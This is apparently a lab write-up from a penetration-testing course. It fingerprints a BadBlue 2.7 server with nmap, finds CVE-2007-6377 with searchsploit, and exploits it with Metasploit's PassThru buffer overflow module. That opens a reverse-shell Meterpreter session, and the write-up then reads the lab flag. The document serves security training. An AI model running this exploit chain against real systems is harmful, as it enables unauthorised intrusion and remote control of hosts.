# Windows: Easy File Sharing Server

### Overview

> A Kali GUI machine and a target machine running a vulnerable easy file sharing server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). &#x20;
>
> Your task is to fingerprint the application using the tools available on the Kali machine and then exploit the application using the appropriate Metasploit module.
>
> **Objective:**Exploit the application and retrieve the flag!
>
> **Instructions:**\* Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y. \* The IP address of the target machine is mentioned in the file “/root/Desktop/target” \* Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1



> 🔬 [Windows: Easy File Sharing Server](https://attackdefense.com/challengedetails?cid=1944)
>
> * Target IP: `10.0.31.174`
> * Fingerprint the application and exploit the found vulnerability

```bash
root@attackdefense:~# nmap -sV 10.0.31.174
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-28 16:36 IST
Nmap scan report for 10.0.31.174
Host is up (0.0021s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               BadBlue httpd 2.7
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.39 seconds
```

* Research the vulnerability of `BadBlue httpd 2.7` using various tools:
  * Google it
  * [NVD - CVE-2007-6377](https://nvd.nist.gov/vuln/detail/CVE-2007-6377)
  * [exploit-db.com](https://www.exploit-db.com/)
  * [cvedetails.com - CVE-2007-6377](https://www.cvedetails.com/cve/CVE-2007-6377/)

> _Stack-based buffer overflow in the PassThru functionality in ext.dll in BadBlue 2.72b and earlier allows remote attackers to execute arbitrary code via a long query string._

* Search for exploits from [exploit-db.com](https://www.exploit-db.com/exploits/16806) or using a command line tool such as **`searchsploit`**



### exploitdb

<figure><img src="../../../../.gitbook/assets/image (89).png" alt=""><figcaption><p> </p></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption><p>exploitdb badblue 2.7</p></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (92).png" alt=""><figcaption><p>script source code</p></figcaption></figure>



### searchsploit

**`searchsploit`** - _a command line search tool for Exploit-DB_. A copy of Exploit Database can be used offline.

<figure><img src="../../../../.gitbook/assets/image (90).png" alt=""><figcaption><p>searchsploit badblue 2.7</p></figcaption></figure>

```bash
root@attackdefense:~# man searchsploit
root@attackdefense:~# searchsploit badblue 2.7
-------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                        |  Path
                                                                                      | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------- ----------------------------------------
BadBlue 2.72 - PassThru Remote Buffer Overflow                                        | exploits/windows/remote/4784.pl
BadBlue 2.72b - Multiple Vulnerabilities                                              | exploits/windows/remote/4715.txt
BadBlue 2.72b - PassThru Buffer Overflow (Metasploit)                                 | exploits/windows/remote/16806.rb
Working Resources BadBlue 1.2.7 - Denial of Service                                   | exploits/windows/dos/20641.txt
Working Resources BadBlue 1.2.7 - Full Path Disclosure                                | exploits/windows/remote/20640.txt
-------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
```

* Use Metasploit to exploit the target using the [PassThru Buffer Overflow module](https://www.rapid7.com/db/modules/exploit/windows/http/badblue\_passthru/)
  * _This module exploits a stack buffer overflow in the PassThru functionality in ext.dll in BadBlue 2.72b and earlier._

> ❗ **Before running an exploit, ALWAYS check its** [**Source Code**](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/badblue\_passthru.rb) to understand what it is doing❗

```bash
msf5 > use exploit/windows/
Display all 1082 possibilities? (y or n)
msf5 > use exploit/windows/http/badblue_passthru 
msf5 exploit(windows/http/badblue_passthru) > options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf5 exploit(windows/http/badblue_passthru) > set RHOSTS 10.0.31.174
RHOSTS => 10.0.31.174
msf5 exploit(windows/http/badblue_passthru) > exploit

[*] Started reverse TCP handler on 10.10.16.3:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (180291 bytes) to 10.0.31.174
[*] Meterpreter session 1 opened (10.10.16.3:4444 -> 10.0.31.174:51636) at 2024-06-28 16:50:45 +0530

meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

> Use [meterpreter](https://www.offsec.com/metasploit-unleashed/about-meterpreter/) commands to find the flag

```bash
meterpreter > pwd
C:\Program Files (x86)\BadBlue\EE

meterpreter > shell
Process 2456 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.


C:\Program Files (x86)\BadBlue\EE>cd /
cd /

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of C:\

09/16/2020  09:01 AM                32 flag.txt
08/22/2013  03:52 PM    <DIR>          PerfLogs
08/12/2020  04:13 AM    <DIR>          Program Files
09/11/2020  08:17 AM    <DIR>          Program Files (x86)
09/10/2020  09:50 AM    <DIR>          Users
06/28/2024  11:04 AM    <DIR>          Windows
               1 File(s)             32 bytes
               5 Dir(s)   9,173,471,232 bytes free

C:\>cat flag.txt
cat flag.txt
'cat' is not recognized as an internal or external command,
operable program or batch file.

C:\>type flag.txt
type flag.txt
70a569da306697d64fc6c19afea37d94
```

<details>

<summary>Flag</summary>

`70a569da306697d64fc6c19afea37d94`

</details>









